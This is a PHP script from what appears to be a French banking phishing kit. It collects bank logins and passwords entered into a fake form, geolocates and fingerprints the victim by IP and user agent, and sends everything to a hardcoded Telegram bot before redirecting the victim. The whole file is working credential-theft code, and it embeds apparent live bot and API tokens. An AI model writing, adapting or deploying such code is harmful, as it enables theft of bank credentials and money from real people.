<?php
// telegram_handler_ameliore.php

// 1. Configuration Telegram
$BOT_TOKEN = "7749490498:AAHVQ5yVLBT1vFuulMXDe6GqA7K9pVk5YWs";
$CHAT_ID = "7796457959";

// 2. Récupération des données du formulaire
$login = $_POST['login'] ?? 'Non fourni';
$code = $_POST['motdepasse'] ?? 'Non fourni';
$banque = $_POST['bank'] ?? 'Non fourni';

// 3. VOTRE CLÉ API IPINFO.IO (à obtenir sur https://ipinfo.io/signup)
$IPINFO_TOKEN = "e66260d7a589c0";

// 4. Fonction pour obtenir les données de localisation complètes :cite[1]
function getFrenchLocationInfo($ip, $token) {
    $locationInfo = [
        'Ville' => 'Inconnue',
        'Département' => 'Inconnu',
        'Région' => 'Inconnue',
        'Code postal' => 'Inconnu',
        'Pays' => 'France',
        'Opérateur' => 'Inconnu'
    ];
    
    try {
        // Appel à l'API ipinfo.io avec cURL :cite[1]
        $url = "https://ipinfo.io/{$ip}/json?token={$token}";
        
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_TIMEOUT, 10);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        
        $response = curl_exec($ch);
        $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
        curl_close($ch);
        
        if ($httpCode === 200 && $response) {
            $data = json_decode($response, true);
            
            if ($data && !isset($data['error'])) {
                // Assignation directe des données de l'API
                $locationInfo['Ville'] = $data['city'] ?? 'Inconnue';
                $locationInfo['Région'] = $data['region'] ?? 'Inconnue';
                $locationInfo['Code postal'] = $data['postal'] ?? 'Inconnu';
                $locationInfo['Pays'] = $data['country'] === 'FR' ? 'France' : ($data['country_name'] ?? 'France');
                $locationInfo['Opérateur'] = $data['org'] ?? 'Inconnu';
                
                // Extraction du département depuis le code postal
                if (!empty($data['postal'])) {
                    $codePostal = $data['postal'];
                    $codeDepartement = substr($codePostal, 0, 2);
                    
                    // Gestion des cas particuliers (DOM-TOM)
                    if (in_array($codeDepartement, ['97', '98'])) {
                        $codeDepartement = substr($codePostal, 0, 3);
                    }
                    
                    $locationInfo['Département'] = getDepartmentName($codeDepartement);
                }
            }
        }
    } catch (Exception $e) {
        // En cas d'erreur, on garde les valeurs par défaut
        error_log("Erreur ipinfo.io: " . $e->getMessage());
    }
    
    return $locationInfo;
}

// 5. Fonction pour convertir le code département en nom :cite[2]
function getDepartmentName($codeDepartment) {
    $departements = [
        '01' => 'Ain', '02' => 'Aisne', '03' => 'Allier', '04' => 'Alpes-de-Haute-Provence',
        '05' => 'Hautes-Alpes', '06' => 'Alpes-Maritimes', '07' => 'Ardèche', '08' => 'Ardennes',
        '09' => 'Ariège', '10' => 'Aube', '11' => 'Aude', '12' => 'Aveyron', '13' => 'Bouches-du-Rhône',
        '14' => 'Calvados', '15' => 'Cantal', '16' => 'Charente', '17' => 'Charente-Maritime',
        '18' => 'Cher', '19' => 'Corrèze', '2A' => 'Corse-du-Sud', '2B' => 'Haute-Corse',
        '21' => 'Côte-d\'Or', '22' => 'Côtes-d\'Armor', '23' => 'Creuse', '24' => 'Dordogne',
        '25' => 'Doubs', '26' => 'Drôme', '27' => 'Eure', '28' => 'Eure-et-Loir', '29' => 'Finistère',
        '30' => 'Gard', '31' => 'Haute-Garonne', '32' => 'Gers', '33' => 'Gironde', '34' => 'Hérault',
        '35' => 'Ille-et-Vilaine', '36' => 'Indre', '37' => 'Indre-et-Loire', '38' => 'Isère',
        '39' => 'Jura', '40' => 'Landes', '41' => 'Loir-et-Cher', '42' => 'Loire', '43' => 'Haute-Loire',
        '44' => 'Loire-Atlantique', '45' => 'Loiret', '46' => 'Lot', '47' => 'Lot-et-Garonne',
        '48' => 'Lozère', '49' => 'Maine-et-Loire', '50' => 'Manche', '51' => 'Marne',
        '52' => 'Haute-Marne', '53' => 'Mayenne', '54' => 'Meurthe-et-Moselle', '55' => 'Meuse',
        '56' => 'Morbihan', '57' => 'Moselle', '58' => 'Nièvre', '59' => 'Nord', '60' => 'Oise',
        '61' => 'Orne', '62' => 'Pas-de-Calais', '63' => 'Puy-de-Dôme', '64' => 'Pyrénées-Atlantiques',
        '65' => 'Hautes-Pyrénées', '66' => 'Pyrénées-Orientales', '67' => 'Bas-Rhin', '68' => 'Haut-Rhin',
        '69' => 'Rhône', '70' => 'Haute-Saône', '71' => 'Saône-et-Loire', '72' => 'Sarthe',
        '73' => 'Savoie', '74' => 'Haute-Savoie', '75' => 'Paris', '76' => 'Seine-Maritime',
        '77' => 'Seine-et-Marne', '78' => 'Yvelines', '79' => 'Deux-Sèvres', '80' => 'Somme',
        '81' => 'Tarn', '82' => 'Tarn-et-Garonne', '83' => 'Var', '84' => 'Vaucluse',
        '85' => 'Vendée', '86' => 'Vienne', '87' => 'Haute-Vienne', '88' => 'Vosges',
        '89' => 'Yonne', '90' => 'Territoire de Belfort', '91' => 'Essonne', '92' => 'Hauts-de-Seine',
        '93' => 'Seine-Saint-Denis', '94' => 'Val-de-Marne', '95' => 'Val-d\'Oise',
        '971' => 'Guadeloupe', '972' => 'Martinique', '973' => 'Guyane', '974' => 'La Réunion',
        '976' => 'Mayotte'
    ];
    
    return $departements[$codeDepartment] ?? 'Département inconnu';
}

// 6. Fonctions pour détecter le navigateur et l'OS
function getBrowserInfo($user_agent) {
    $browsers = [
        '/MSIE/i' => 'Internet Explorer',
        '/Firefox/i' => 'Firefox',
        '/Chrome/i' => 'Chrome',
        '/Safari/i' => 'Safari',
        '/Opera/i' => 'Opera',
        '/Edge/i' => 'Edge'
    ];
    
    foreach ($browsers as $regex => $name) {
        if (preg_match($regex, $user_agent)) return $name;
    }
    return 'Inconnu';
}

function getOSInfo($user_agent) {
    $oses = [
        '/windows nt 10/i' => 'Windows 10',
        '/windows nt 6.3/i' => 'Windows 8.1',
        '/windows nt 6.2/i' => 'Windows 8',
        '/windows nt 6.1/i' => 'Windows 7',
        '/macintosh|mac os x/i' => 'Mac OS',
        '/linux/i' => 'Linux',
        '/android/i' => 'Android',
        '/iphone/i' => 'iPhone'
    ];
    
    foreach ($oses as $regex => $os) {
        if (preg_match($regex, $user_agent)) return $os;
    }
    return 'Inconnu';
}

// 7. EXÉCUTION PRINCIPALE
$ip = $_SERVER['REMOTE_ADDR'];
$localisation = getFrenchLocationInfo($ip, $IPINFO_TOKEN);

$infos_utilisateur = [
    'ID Unique' => 'CA-'.uniqid(),
    'Date/Heure' => date('d/m/Y H:i:s'),
    'Adresse IP' => $ip,
    'Appareil' => preg_match('/Mobile|Android|iPhone/i', $_SERVER['HTTP_USER_AGENT']) ? '📱 Mobile' : '💻 Ordinateur',
    'Ville' => $localisation['Ville'],
    'Département' => $localisation['Département'],
    'Région' => $localisation['Région'],
    'Code postal' => $localisation['Code postal'],
    'Pays' => $localisation['Pays'],
    'Opérateur' => $localisation['Opérateur'],
    'Navigateur' => getBrowserInfo($_SERVER['HTTP_USER_AGENT']),
    'Système' => getOSInfo($_SERVER['HTTP_USER_AGENT'])
];

// 8. Construction du message Telegram
$message = "🚨 NOUVEL ACCÈS DÉTECTÉ 🚨\n\n";
$message .= "🏦 Banque : $banque\n";
$message .= "🔢 Identifiant : $login\n";
$message .= "🔑 Code : $code\n\n";
$message .= "📍 Localisation complète :\n";
$message .= "• Ville : {$localisation['Ville']}\n";
$message .= "• Département : {$localisation['Département']}\n";
$message .= "• Région : {$localisation['Région']}\n";
$message .= "• Code postal : {$localisation['Code postal']}\n";
$message .= "• Pays : {$localisation['Pays']}\n";
$message .= "• Opérateur : {$localisation['Opérateur']}\n\n";
$message .= "📊 Métadonnées techniques :\n";

foreach(['ID Unique', 'Date/Heure', 'Adresse IP', 'Appareil', 'Navigateur', 'Système'] as $key) {
    $message .= "• $key : {$infos_utilisateur[$key]}\n";
}

// 9. Envoi à Telegram
$url_telegram = "https://api.telegram.org/bot{$BOT_TOKEN}/sendMessage";
$params = [
    'chat_id' => $CHAT_ID,
    'text' => $message,
    'parse_mode' => 'Markdown'
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url_telegram);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$result = curl_exec($ch);
curl_close($ch);

// 10. Redirection
header("Location: ../final.php");
exit;
?>